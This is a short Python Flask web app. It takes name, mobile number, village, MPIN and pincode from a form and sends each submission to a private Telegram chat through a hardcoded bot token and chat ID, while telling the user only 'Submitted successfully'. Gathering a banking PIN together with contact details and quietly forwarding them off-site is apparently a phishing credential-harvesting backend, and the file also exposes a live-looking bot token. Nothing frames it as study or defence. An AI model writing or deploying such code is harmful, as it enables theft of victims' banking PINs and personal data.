from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form.get("name")
    mobile = request.form.get("mobile")
    village = request.form.get("village")
    mpin = request.form.get("mpin")
    pincode = request.form.get("pincode")

    # validation
    if not name or not mobile or not village or not mpin or not pincode:
        return "Please fill all fields"

    # message
    msg = f"""
📥 New Data

👤 Name: {name}
📱 Mobile: {mobile}
🏡 Village: {village}
🔐 MPIN: {mpin}
📍 Pincode: {pincode}
"""

    # telegram send
    url = f"https://api.telegram.org/bot8721390421:AAHeLwV1GR68qNNzBjgfA5XvEaK7G1K3sKs/sendMessage"
    
    data = {
        "chat_id": "7021009916",
        "text": msg
    }

    requests.post(url, data=data)

    return "Submitted successfully"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
